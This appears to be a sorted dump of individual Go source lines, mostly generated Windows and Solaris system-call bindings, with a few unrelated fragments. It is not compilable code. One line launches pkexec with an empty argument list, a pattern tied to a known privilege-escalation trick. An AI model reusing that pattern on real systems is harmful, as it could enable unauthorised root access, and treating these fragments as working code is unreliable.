"procIsValidSecurityDescriptor                            = modadvapi32.NewProc(""IsValidSecurityDescriptor"")"
"procIsValidSid                                           = modadvapi32.NewProc(""IsValidSid"")"
"procIsWellKnownSid                                       = modadvapi32.NewProc(""IsWellKnownSid"")"
"procIsWow64Process                                       = modkernel32.NewProc(""IsWow64Process"")"
"procIsWow64Process2                                      = modkernel32.NewProc(""IsWow64Process2"")"
"procKill)), 2, uintptr(pid), uintptr(signum), 0, 0, 0, 0)"
"procKill,"
"procLchown)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid), 0, 0, 0)"
"procLchown,"
"procLink)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0, 0, 0, 0)"
"procLink,"
"procLoadLibraryExW                                       = modkernel32.NewProc(""LoadLibraryExW"")"
"procLoadLibraryW                                         = modkernel32.NewProc(""LoadLibraryW"")"
"procLoadResource                                         = modkernel32.NewProc(""LoadResource"")"
"procLocalAlloc                                           = modkernel32.NewProc(""LocalAlloc"")"
"procLocalFree                                            = modkernel32.NewProc(""LocalFree"")"
"procLockFileEx                                           = modkernel32.NewProc(""LockFileEx"")"
"procLockResource                                         = modkernel32.NewProc(""LockResource"")"
"procLookupAccountNameW                                   = modadvapi32.NewProc(""LookupAccountNameW"")"
"procLookupAccountSidW                                    = modadvapi32.NewProc(""LookupAccountSidW"")"
"procLookupPrivilegeValueW                                = modadvapi32.NewProc(""LookupPrivilegeValueW"")"
"procLstat)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0, 0, 0, 0)"
"procLstat,"
"procMadvise)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(len(b)), uintptr(advice), 0, 0, 0)"
"procMadvise,"
"procMakeAbsoluteSD                                       = modadvapi32.NewProc(""MakeAbsoluteSD"")"
"procMakeSelfRelativeSD                                   = modadvapi32.NewProc(""MakeSelfRelativeSD"")"
"procMapViewOfFile                                        = modkernel32.NewProc(""MapViewOfFile"")"
"procMessageBoxW                                          = moduser32.NewProc(""MessageBoxW"")"
"procMkdir)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0, 0)"
"procMkdir,"
"procMkdirat)), 3, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0)"
"procMkdirat,"
"procMkfifo)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0, 0)"
"procMkfifo,"
"procMkfifoat)), 3, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0)"
"procMkfifoat,"
"procMknod)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev), 0, 0, 0)"
"procMknod,"
"procMknodat)), 4, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev), 0, 0)"
"procMknodat,"
"procMlock)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(len(b)), 0, 0, 0, 0)"
"procMlock,"
"procMlockall)), 1, uintptr(flags), 0, 0, 0, 0, 0)"
"procMlockall,"
"procModule32FirstW                                       = modkernel32.NewProc(""Module32FirstW"")"
"procModule32NextW                                        = modkernel32.NewProc(""Module32NextW"")"
"procMoveFileExW                                          = modkernel32.NewProc(""MoveFileExW"")"
"procMoveFileW                                            = modkernel32.NewProc(""MoveFileW"")"
"procMprotect)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(len(b)), uintptr(prot), 0, 0, 0)"
"procMprotect,"
"procMsync)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(len(b)), uintptr(flags), 0, 0, 0)"
"procMsync,"
"procMultiByteToWideChar                                  = modkernel32.NewProc(""MultiByteToWideChar"")"
"procMunlock)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(len(b)), 0, 0, 0, 0)"
"procMunlock,"
"procMunlockall)), 0, 0, 0, 0, 0, 0, 0)"
"procMunlockall,"
"procNanosleep)), 2, uintptr(unsafe.Pointer(time)), uintptr(unsafe.Pointer(leftover)), 0, 0, 0, 0)"
"procNanosleep,"
"procNetApiBufferFree                                     = modnetapi32.NewProc(""NetApiBufferFree"")"
"procNetGetJoinInformation                                = modnetapi32.NewProc(""NetGetJoinInformation"")"
"procNetUserGetInfo                                       = modnetapi32.NewProc(""NetUserGetInfo"")"
"procNotifyServiceStatusChangeW                           = modadvapi32.NewProc(""NotifyServiceStatusChangeW"")"
"procNtCreateFile                                         = modntdll.NewProc(""NtCreateFile"")"
"procNtCreateNamedPipeFile                                = modntdll.NewProc(""NtCreateNamedPipeFile"")"
"procNtQueryInformationProcess                            = modntdll.NewProc(""NtQueryInformationProcess"")"
"procNtQuerySystemInformation                             = modntdll.NewProc(""NtQuerySystemInformation"")"
"procNtSetInformationFile                                 = modntdll.NewProc(""NtSetInformationFile"")"
"procNtSetInformationProcess                              = modntdll.NewProc(""NtSetInformationProcess"")"
"procNtSetSystemInformation                               = modntdll.NewProc(""NtSetSystemInformation"")"
"procOpen)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm), 0, 0, 0)"
"procOpen,"
"procOpenEventW                                           = modkernel32.NewProc(""OpenEventW"")"
"procOpenMutexW                                           = modkernel32.NewProc(""OpenMutexW"")"
"procOpenProcess                                          = modkernel32.NewProc(""OpenProcess"")"
"procOpenProcessToken                                     = modadvapi32.NewProc(""OpenProcessToken"")"
"procOpenSCManagerW                                       = modadvapi32.NewProc(""OpenSCManagerW"")"
"procOpenServiceW                                         = modadvapi32.NewProc(""OpenServiceW"")"
"procOpenThread                                           = modkernel32.NewProc(""OpenThread"")"
"procOpenThreadToken                                      = modadvapi32.NewProc(""OpenThreadToken"")"
"procOpenat)), 4, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags), uintptr(mode), 0, 0)"
"procOpenat,"
"procPFXImportCertStore                                   = modcrypt32.NewProc(""PFXImportCertStore"")"
"procPathconf)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(name), 0, 0, 0, 0)"
"procPathconf,"
"procPause)), 0, 0, 0, 0, 0, 0, 0)"
"procPause,"
"procPostQueuedCompletionStatus                           = modkernel32.NewProc(""PostQueuedCompletionStatus"")"
"procProcess32FirstW                                      = modkernel32.NewProc(""Process32FirstW"")"
"procProcess32NextW                                       = modkernel32.NewProc(""Process32NextW"")"
"procProcessIdToSessionId                                 = modkernel32.NewProc(""ProcessIdToSessionId"")"
"procPulseEvent                                           = modkernel32.NewProc(""PulseEvent"")"
"procQueryDosDeviceW                                      = modkernel32.NewProc(""QueryDosDeviceW"")"
"procQueryFullProcessImageNameW                           = modkernel32.NewProc(""QueryFullProcessImageNameW"")"
"procQueryInformationJobObject                            = modkernel32.NewProc(""QueryInformationJobObject"")"
"procQueryServiceConfig2W                                 = modadvapi32.NewProc(""QueryServiceConfig2W"")"
"procQueryServiceConfigW                                  = modadvapi32.NewProc(""QueryServiceConfigW"")"
"procQueryServiceDynamicInformation                       = modadvapi32.NewProc(""QueryServiceDynamicInformation"")"
"procQueryServiceLockStatusW                              = modadvapi32.NewProc(""QueryServiceLockStatusW"")"
"procQueryServiceStatus                                   = modadvapi32.NewProc(""QueryServiceStatus"")"
"procQueryServiceStatusEx                                 = modadvapi32.NewProc(""QueryServiceStatusEx"")"
"procReadConsoleW                                         = modkernel32.NewProc(""ReadConsoleW"")"
"procReadDirectoryChangesW                                = modkernel32.NewProc(""ReadDirectoryChangesW"")"
"procReadFile                                             = modkernel32.NewProc(""ReadFile"")"
"procReadProcessMemory                                    = modkernel32.NewProc(""ReadProcessMemory"")"
"procReadlink)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(len(buf)), 0, 0, 0)"
"procReadlink,"
"procRegCloseKey                                          = modadvapi32.NewProc(""RegCloseKey"")"
"procRegEnumKeyExW                                        = modadvapi32.NewProc(""RegEnumKeyExW"")"
"procRegNotifyChangeKeyValue                              = modadvapi32.NewProc(""RegNotifyChangeKeyValue"")"
"procRegOpenKeyExW                                        = modadvapi32.NewProc(""RegOpenKeyExW"")"
"procRegQueryInfoKeyW                                     = modadvapi32.NewProc(""RegQueryInfoKeyW"")"
"procRegQueryValueExW                                     = modadvapi32.NewProc(""RegQueryValueExW"")"
"procRegisterEventSourceW                                 = modadvapi32.NewProc(""RegisterEventSourceW"")"
"procRegisterServiceCtrlHandlerExW                        = modadvapi32.NewProc(""RegisterServiceCtrlHandlerExW"")"
"procReleaseMutex                                         = modkernel32.NewProc(""ReleaseMutex"")"
"procRemoveDirectoryW                                     = modkernel32.NewProc(""RemoveDirectoryW"")"
"procRename)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0, 0, 0, 0)"
"procRename,"
"procRenameat)), 4, uintptr(olddirfd), uintptr(unsafe.Pointer(_p0)), uintptr(newdirfd), uintptr(unsafe.Pointer(_p1)), 0, 0)"
"procRenameat,"
"procReportEventW                                         = modadvapi32.NewProc(""ReportEventW"")"
"procResetEvent                                           = modkernel32.NewProc(""ResetEvent"")"
"procResumeThread                                         = modkernel32.NewProc(""ResumeThread"")"
"procRevertToSelf                                         = modadvapi32.NewProc(""RevertToSelf"")"
"procRmdir)), 1, uintptr(unsafe.Pointer(_p0)), 0, 0, 0, 0, 0)"
"procRmdir,"
"procRtlAddFunctionTable                                  = modntdll.NewProc(""RtlAddFunctionTable"")"
"procRtlDefaultNpAcl                                      = modntdll.NewProc(""RtlDefaultNpAcl"")"
"procRtlDeleteFunctionTable                               = modntdll.NewProc(""RtlDeleteFunctionTable"")"
"procRtlDosPathNameToNtPathName_U_WithStatus              = modntdll.NewProc(""RtlDosPathNameToNtPathName_U_WithStatus"")"
"procRtlDosPathNameToRelativeNtPathName_U_WithStatus      = modntdll.NewProc(""RtlDosPathNameToRelativeNtPathName_U_WithStatus"")"
"procRtlGetCurrentPeb                                     = modntdll.NewProc(""RtlGetCurrentPeb"")"
"procRtlGetNtVersionNumbers                               = modntdll.NewProc(""RtlGetNtVersionNumbers"")"
"procRtlGetVersion                                        = modntdll.NewProc(""RtlGetVersion"")"
"procRtlInitString                                        = modntdll.NewProc(""RtlInitString"")"
"procRtlInitUnicodeString                                 = modntdll.NewProc(""RtlInitUnicodeString"")"
"procRtlNtStatusToDosErrorNoTeb                           = modntdll.NewProc(""RtlNtStatusToDosErrorNoTeb"")"
"procSHGetKnownFolderPath                                 = modshell32.NewProc(""SHGetKnownFolderPath"")"
"procSelect)), 5, uintptr(nfd), uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), 0)"
"procSelect,"
"procSetCommTimeouts                                      = modkernel32.NewProc(""SetCommTimeouts"")"
"procSetConsoleCursorPosition                             = modkernel32.NewProc(""SetConsoleCursorPosition"")"
"procSetConsoleMode                                       = modkernel32.NewProc(""SetConsoleMode"")"
"procSetCurrentDirectoryW                                 = modkernel32.NewProc(""SetCurrentDirectoryW"")"
"procSetDefaultDllDirectories                             = modkernel32.NewProc(""SetDefaultDllDirectories"")"
"procSetDllDirectoryW                                     = modkernel32.NewProc(""SetDllDirectoryW"")"
"procSetEndOfFile                                         = modkernel32.NewProc(""SetEndOfFile"")"
"procSetEntriesInAclW                                     = modadvapi32.NewProc(""SetEntriesInAclW"")"
"procSetEnvironmentVariableW                              = modkernel32.NewProc(""SetEnvironmentVariableW"")"
"procSetErrorMode                                         = modkernel32.NewProc(""SetErrorMode"")"
"procSetEvent                                             = modkernel32.NewProc(""SetEvent"")"
"procSetFileAttributesW                                   = modkernel32.NewProc(""SetFileAttributesW"")"
"procSetFileCompletionNotificationModes                   = modkernel32.NewProc(""SetFileCompletionNotificationModes"")"
"procSetFileInformationByHandle                           = modkernel32.NewProc(""SetFileInformationByHandle"")"
"procSetFilePointer                                       = modkernel32.NewProc(""SetFilePointer"")"
"procSetFileTime                                          = modkernel32.NewProc(""SetFileTime"")"
"procSetHandleInformation                                 = modkernel32.NewProc(""SetHandleInformation"")"
"procSetInformationJobObject                              = modkernel32.NewProc(""SetInformationJobObject"")"
"procSetKernelObjectSecurity                              = modadvapi32.NewProc(""SetKernelObjectSecurity"")"
"procSetNamedPipeHandleState                              = modkernel32.NewProc(""SetNamedPipeHandleState"")"
"procSetNamedSecurityInfoW                                = modadvapi32.NewProc(""SetNamedSecurityInfoW"")"
"procSetPriorityClass                                     = modkernel32.NewProc(""SetPriorityClass"")"
"procSetProcessPriorityBoost                              = modkernel32.NewProc(""SetProcessPriorityBoost"")"
"procSetProcessShutdownParameters                         = modkernel32.NewProc(""SetProcessShutdownParameters"")"
"procSetProcessWorkingSetSizeEx                           = modkernel32.NewProc(""SetProcessWorkingSetSizeEx"")"
"procSetSecurityDescriptorControl                         = modadvapi32.NewProc(""SetSecurityDescriptorControl"")"
"procSetSecurityDescriptorDacl                            = modadvapi32.NewProc(""SetSecurityDescriptorDacl"")"
"procSetSecurityDescriptorGroup                           = modadvapi32.NewProc(""SetSecurityDescriptorGroup"")"
"procSetSecurityDescriptorOwner                           = modadvapi32.NewProc(""SetSecurityDescriptorOwner"")"
"procSetSecurityDescriptorRMControl                       = modadvapi32.NewProc(""SetSecurityDescriptorRMControl"")"
"procSetSecurityDescriptorSacl                            = modadvapi32.NewProc(""SetSecurityDescriptorSacl"")"
"procSetSecurityInfo                                      = modadvapi32.NewProc(""SetSecurityInfo"")"
"procSetServiceStatus                                     = modadvapi32.NewProc(""SetServiceStatus"")"
"procSetStdHandle                                         = modkernel32.NewProc(""SetStdHandle"")"
"procSetThreadToken                                       = modadvapi32.NewProc(""SetThreadToken"")"
"procSetTokenInformation                                  = modadvapi32.NewProc(""SetTokenInformation"")"
"procSetVolumeLabelW                                      = modkernel32.NewProc(""SetVolumeLabelW"")"
"procSetVolumeMountPointW                                 = modkernel32.NewProc(""SetVolumeMountPointW"")"
"procSetegid)), 1, uintptr(egid), 0, 0, 0, 0, 0)"
"procSetegid,"
"procSeteuid)), 1, uintptr(euid), 0, 0, 0, 0, 0)"
"procSeteuid,"
"procSetgid)), 1, uintptr(gid), 0, 0, 0, 0, 0)"
"procSetgid,"
"procSethostname)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(len(p)), 0, 0, 0, 0)"
"procSethostname,"
"procSetpgid)), 2, uintptr(pid), uintptr(pgid), 0, 0, 0, 0)"
"procSetpgid,"
"procSetpriority)), 3, uintptr(which), uintptr(who), uintptr(prio), 0, 0, 0)"
"procSetpriority,"
"procSetregid)), 2, uintptr(rgid), uintptr(egid), 0, 0, 0, 0)"
"procSetregid,"
"procSetreuid)), 2, uintptr(ruid), uintptr(euid), 0, 0, 0, 0)"
"procSetreuid,"
"procSetrlimit)), 2, uintptr(which), uintptr(unsafe.Pointer(lim)), 0, 0, 0, 0)"
"procSetrlimit,"
"procSetsid)), 0, 0, 0, 0, 0, 0, 0)"
"procSetsid,"
"procSetuid)), 1, uintptr(uid), 0, 0, 0, 0, 0)"
"procSetuid,"
"procSetupDiBuildDriverInfoList                           = modsetupapi.NewProc(""SetupDiBuildDriverInfoList"")"
"procSetupDiCallClassInstaller                            = modsetupapi.NewProc(""SetupDiCallClassInstaller"")"
"procSetupDiCancelDriverInfoSearch                        = modsetupapi.NewProc(""SetupDiCancelDriverInfoSearch"")"
"procSetupDiClassGuidsFromNameExW                         = modsetupapi.NewProc(""SetupDiClassGuidsFromNameExW"")"
"procSetupDiClassNameFromGuidExW                          = modsetupapi.NewProc(""SetupDiClassNameFromGuidExW"")"
"procSetupDiCreateDeviceInfoListExW                       = modsetupapi.NewProc(""SetupDiCreateDeviceInfoListExW"")"
"procSetupDiCreateDeviceInfoW                             = modsetupapi.NewProc(""SetupDiCreateDeviceInfoW"")"
"procSetupDiDestroyDeviceInfoList                         = modsetupapi.NewProc(""SetupDiDestroyDeviceInfoList"")"
"procSetupDiDestroyDriverInfoList                         = modsetupapi.NewProc(""SetupDiDestroyDriverInfoList"")"
"procSetupDiEnumDeviceInfo                                = modsetupapi.NewProc(""SetupDiEnumDeviceInfo"")"
"procSetupDiEnumDriverInfoW                               = modsetupapi.NewProc(""SetupDiEnumDriverInfoW"")"
"procSetupDiGetClassDevsExW                               = modsetupapi.NewProc(""SetupDiGetClassDevsExW"")"
"procSetupDiGetClassInstallParamsW                        = modsetupapi.NewProc(""SetupDiGetClassInstallParamsW"")"
"procSetupDiGetDeviceInfoListDetailW                      = modsetupapi.NewProc(""SetupDiGetDeviceInfoListDetailW"")"
"procSetupDiGetDeviceInstallParamsW                       = modsetupapi.NewProc(""SetupDiGetDeviceInstallParamsW"")"
"procSetupDiGetDeviceInstanceIdW                          = modsetupapi.NewProc(""SetupDiGetDeviceInstanceIdW"")"
"procSetupDiGetDevicePropertyW                            = modsetupapi.NewProc(""SetupDiGetDevicePropertyW"")"
"procSetupDiGetDeviceRegistryPropertyW                    = modsetupapi.NewProc(""SetupDiGetDeviceRegistryPropertyW"")"
"procSetupDiGetDriverInfoDetailW                          = modsetupapi.NewProc(""SetupDiGetDriverInfoDetailW"")"
"procSetupDiGetSelectedDevice                             = modsetupapi.NewProc(""SetupDiGetSelectedDevice"")"
"procSetupDiGetSelectedDriverW                            = modsetupapi.NewProc(""SetupDiGetSelectedDriverW"")"
"procSetupDiOpenDevRegKey                                 = modsetupapi.NewProc(""SetupDiOpenDevRegKey"")"
"procSetupDiSetClassInstallParamsW                        = modsetupapi.NewProc(""SetupDiSetClassInstallParamsW"")"
"procSetupDiSetDeviceInstallParamsW                       = modsetupapi.NewProc(""SetupDiSetDeviceInstallParamsW"")"
"procSetupDiSetDeviceRegistryPropertyW                    = modsetupapi.NewProc(""SetupDiSetDeviceRegistryPropertyW"")"
"procSetupDiSetSelectedDevice                             = modsetupapi.NewProc(""SetupDiSetSelectedDevice"")"
"procSetupDiSetSelectedDriverW                            = modsetupapi.NewProc(""SetupDiSetSelectedDriverW"")"
"procSetupUninstallOEMInfW                                = modsetupapi.NewProc(""SetupUninstallOEMInfW"")"
"procShellExecuteW                                        = modshell32.NewProc(""ShellExecuteW"")"
"procSizeofResource                                       = modkernel32.NewProc(""SizeofResource"")"
"procSleepEx                                              = modkernel32.NewProc(""SleepEx"")"
"procStartServiceCtrlDispatcherW                          = modadvapi32.NewProc(""StartServiceCtrlDispatcherW"")"
"procStartServiceW                                        = modadvapi32.NewProc(""StartServiceW"")"
"procStat)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0, 0, 0, 0)"
"procStat,"
"procStatvfs)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(vfsstat)), 0, 0, 0, 0)"
"procStatvfs,"
"procStringFromGUID2                                      = modole32.NewProc(""StringFromGUID2"")"
"procSubscribeServiceChangeNotifications                  = modsechost.NewProc(""SubscribeServiceChangeNotifications"")"
"procSymlink)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0, 0, 0, 0)"
"procSymlink,"
"procSync)), 0, 0, 0, 0, 0, 0, 0)"
"procSync,"
"procSysconf)), 1, uintptr(which), 0, 0, 0, 0, 0)"
"procSysconf,"
"procTerminateJobObject                                   = modkernel32.NewProc(""TerminateJobObject"")"
"procTerminateProcess                                     = modkernel32.NewProc(""TerminateProcess"")"
"procThread32First                                        = modkernel32.NewProc(""Thread32First"")"
"procThread32Next                                         = modkernel32.NewProc(""Thread32Next"")"
"procTimes)), 1, uintptr(unsafe.Pointer(tms)), 0, 0, 0, 0, 0)"
"procTimes,"
"procTranslateNameW                                       = modsecur32.NewProc(""TranslateNameW"")"
"procTransmitFile                                         = modmswsock.NewProc(""TransmitFile"")"
"procTruncate)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(length), 0, 0, 0, 0)"
"procTruncate,"
"procUmask)), 1, uintptr(mask), 0, 0, 0, 0, 0)"
"procUmask,"
"procUname)), 1, uintptr(unsafe.Pointer(buf)), 0, 0, 0, 0, 0)"
"procUname,"
"procUnlink)), 1, uintptr(unsafe.Pointer(_p0)), 0, 0, 0, 0, 0)"
"procUnlink,"
"procUnlinkat)), 3, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0, 0, 0)"
"procUnlinkat,"
"procUnlockFileEx                                         = modkernel32.NewProc(""UnlockFileEx"")"
"procUnmapViewOfFile                                      = modkernel32.NewProc(""UnmapViewOfFile"")"
"procUnsubscribeServiceChangeNotifications                = modsechost.NewProc(""UnsubscribeServiceChangeNotifications"")"
"procUpdateProcThreadAttribute                            = modkernel32.NewProc(""UpdateProcThreadAttribute"")"
"procUstat)), 2, uintptr(dev), uintptr(unsafe.Pointer(ubuf)), 0, 0, 0, 0)"
"procUstat,"
"procUtime)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(buf)), 0, 0, 0, 0)"
"procUtime,"
"procVerQueryValueW                                       = modversion.NewProc(""VerQueryValueW"")"
"procVirtualAlloc                                         = modkernel32.NewProc(""VirtualAlloc"")"
"procVirtualFree                                          = modkernel32.NewProc(""VirtualFree"")"
"procVirtualLock                                          = modkernel32.NewProc(""VirtualLock"")"
"procVirtualProtect                                       = modkernel32.NewProc(""VirtualProtect"")"
"procVirtualProtectEx                                     = modkernel32.NewProc(""VirtualProtectEx"")"
"procVirtualQuery                                         = modkernel32.NewProc(""VirtualQuery"")"
"procVirtualQueryEx                                       = modkernel32.NewProc(""VirtualQueryEx"")"
"procVirtualUnlock                                        = modkernel32.NewProc(""VirtualUnlock"")"
"procWSACleanup                                           = modws2_32.NewProc(""WSACleanup"")"
"procWSAEnumProtocolsW                                    = modws2_32.NewProc(""WSAEnumProtocolsW"")"
"procWSAGetOverlappedResult                               = modws2_32.NewProc(""WSAGetOverlappedResult"")"
"procWSAIoctl                                             = modws2_32.NewProc(""WSAIoctl"")"
"procWSARecv                                              = modws2_32.NewProc(""WSARecv"")"
"procWSARecvFrom                                          = modws2_32.NewProc(""WSARecvFrom"")"
"procWSASend                                              = modws2_32.NewProc(""WSASend"")"
"procWSASendTo                                            = modws2_32.NewProc(""WSASendTo"")"
"procWSASocketW                                           = modws2_32.NewProc(""WSASocketW"")"
"procWSAStartup                                           = modws2_32.NewProc(""WSAStartup"")"
"procWTSEnumerateSessionsW                                = modwtsapi32.NewProc(""WTSEnumerateSessionsW"")"
"procWTSFreeMemory                                        = modwtsapi32.NewProc(""WTSFreeMemory"")"
"procWTSGetActiveConsoleSessionId                         = modkernel32.NewProc(""WTSGetActiveConsoleSessionId"")"
"procWTSQueryUserToken                                    = modwtsapi32.NewProc(""WTSQueryUserToken"")"
"procWaitForMultipleObjects                               = modkernel32.NewProc(""WaitForMultipleObjects"")"
"procWaitForSingleObject                                  = modkernel32.NewProc(""WaitForSingleObject"")"
"procWinVerifyTrustEx                                     = modwintrust.NewProc(""WinVerifyTrustEx"")"
"procWriteConsoleW                                        = modkernel32.NewProc(""WriteConsoleW"")"
"procWriteFile                                            = modkernel32.NewProc(""WriteFile"")"
"procWriteProcessMemory                                   = modkernel32.NewProc(""WriteProcessMemory"")"
"proc__major)), 2, uintptr(version), uintptr(dev), 0, 0, 0, 0)"
"proc__major,"
"proc__makedev)), 3, uintptr(version), uintptr(major), uintptr(minor), 0, 0, 0)"
"proc__makedev,"
"proc__minor)), 2, uintptr(version), uintptr(dev), 0, 0, 0, 0)"
"proc__minor,"
"proc__xnet_bind)), 3, uintptr(s), uintptr(addr), uintptr(addrlen), 0, 0, 0)"
"proc__xnet_bind,"
"proc__xnet_connect)), 3, uintptr(s), uintptr(addr), uintptr(addrlen), 0, 0, 0)"
"proc__xnet_connect,"
"proc__xnet_getsockopt)), 5, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(unsafe.Pointer(vallen)), 0)"
"proc__xnet_getsockopt,"
"proc__xnet_llisten)), 2, uintptr(s), uintptr(backlog), 0, 0, 0, 0)"
"proc__xnet_llisten,"
"proc__xnet_recvmsg)), 3, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags), 0, 0, 0)"
"proc__xnet_recvmsg,"
"proc__xnet_sendmsg)), 3, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags), 0, 0, 0)"
"proc__xnet_sendmsg,"
"proc__xnet_sendto)), 6, uintptr(s), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(flags), uintptr(to), uintptr(addrlen))"
"proc__xnet_sendto,"
"proc__xnet_socket)), 3, uintptr(domain), uintptr(typ), uintptr(proto), 0, 0, 0)"
"proc__xnet_socket,"
"proc__xnet_socketpair)), 4, uintptr(domain), uintptr(typ), uintptr(proto), uintptr(unsafe.Pointer(fd)), 0, 0)"
"proc__xnet_socketpair,"
"procaccept)), 3, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), 0, 0, 0)"
"procaccept,"
"procaccept4)), 4, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), uintptr(flags), 0, 0)"
"procaccept4,"
"procacct)), 1, uintptr(unsafe.Pointer(path)), 0, 0, 0, 0, 0)"
"procacct,"
"procbind                                                 = modws2_32.NewProc(""bind"")"
"procclosesocket                                          = modws2_32.NewProc(""closesocket"")"
"procconnect                                              = modws2_32.NewProc(""connect"")"
"process, err := os.StartProcess(pkexecPath, nil, procAttr)"
"processEntry32, err error) {"
"processFlagForGroupAnnotation(flags, pflag, mutuallyExclusive, mutuallyExclusiveGroupStatus)"
"processFlagForGroupAnnotation(flags, pflag, requiredAsGroup, groupStatus)"
"procfcntl)), 3, uintptr(fd), uintptr(cmd), uintptr(arg), 0, 0, 0)"
"procfcntl)), 3, uintptr(fd), uintptr(cmd), uintptr(unsafe.Pointer(lk)), 0, 0, 0)"
"procfcntl,"
"procfutimesat)), 3, uintptr(fildes), uintptr(unsafe.Pointer(path)), uintptr(unsafe.Pointer(times)), 0, 0, 0)"
"procfutimesat,"
"procgetgroups)), 2, uintptr(ngid), uintptr(unsafe.Pointer(gid)), 0, 0, 0, 0)"
"procgetgroups,"
"procgethostbyname                                        = modws2_32.NewProc(""gethostbyname"")"
"procgethostname)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), 0, 0, 0, 0)"
"procgethostname,"
"procgetmsg)), 4, uintptr(fd), uintptr(unsafe.Pointer(clptr)), uintptr(unsafe.Pointer(dataptr)), uintptr(unsafe.Pointer(flags)), 0, 0)"
"procgetpeername                                          = modws2_32.NewProc(""getpeername"")"
"procgetpeername)), 3, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), 0, 0, 0)"
"procgetpeername,"
"procgetprotobyname                                       = modws2_32.NewProc(""getprotobyname"")"
"procgetservbyname                                        = modws2_32.NewProc(""getservbyname"")"
"procgetsockname                                          = modws2_32.NewProc(""getsockname"")"
"procgetsockname)), 3, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), 0, 0, 0)"
"procgetsockname,"
"procgetsockopt                                           = modws2_32.NewProc(""getsockopt"")"
"procioctl)), 3, fd, cmd, ptr, 0, 0, 0)"
"procioctl)), 3, uintptr(fd), uintptr(req), uintptr(arg), 0, 0, 0)"
"procioctl,"
"proclisten                                               = modws2_32.NewProc(""listen"")"
"proclseek)), 3, uintptr(fd), uintptr(offset), uintptr(whence), 0, 0, 0)"
"proclseek,"
"procmmap)), 6, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), uintptr(pos))"
"procmmap,"
"procmunmap)), 2, uintptr(addr), uintptr(length), 0, 0, 0, 0)"
"procmunmap,"
"procntohs                                                = modws2_32.NewProc(""ntohs"")"
"procpipe)), 1, uintptr(unsafe.Pointer(p)), 0, 0, 0, 0, 0)"
"procpipe,"
"procpipe2)), 2, uintptr(unsafe.Pointer(p)), uintptr(flags), 0, 0, 0, 0)"
"procpipe2,"
"procpoll)), 3, uintptr(unsafe.Pointer(fds)), uintptr(nfds), uintptr(timeout), 0, 0, 0)"
"procpoll,"
"procport_associate)), 5, uintptr(port), uintptr(source), uintptr(object), uintptr(events), uintptr(unsafe.Pointer(user)), 0)"
"procport_associate,"
"procport_create)), 0, 0, 0, 0, 0, 0, 0)"
"procport_create,"
"procport_dissociate)), 3, uintptr(port), uintptr(source), uintptr(object), 0, 0, 0)"
"procport_dissociate,"
"procport_get)), 3, uintptr(port), uintptr(unsafe.Pointer(pe)), uintptr(unsafe.Pointer(timeout)), 0, 0, 0)"
"procport_get,"
"procport_getn)), 5, uintptr(port), uintptr(unsafe.Pointer(pe)), uintptr(max), uintptr(unsafe.Pointer(nget)), uintptr(unsafe.Pointer(timeout)), 0)"
"procpread)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(p)), uintptr(offset), 0, 0)"
"procpread,"
"procpreadv)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(iovs)), uintptr(off), 0, 0)"
"procpreadv,"
"procputmsg)), 4, uintptr(fd), uintptr(unsafe.Pointer(clptr)), uintptr(unsafe.Pointer(dataptr)), uintptr(flags), 0, 0)"
"procputmsg,"
"procpwrite)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(p)), uintptr(offset), 0, 0)"
"procpwrite,"
"procpwritev)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(iovs)), uintptr(off), 0, 0)"
"procpwritev,"
"procread)), 3, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(p)), 0, 0, 0)"
"procread)), 3, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf), 0, 0, 0)"
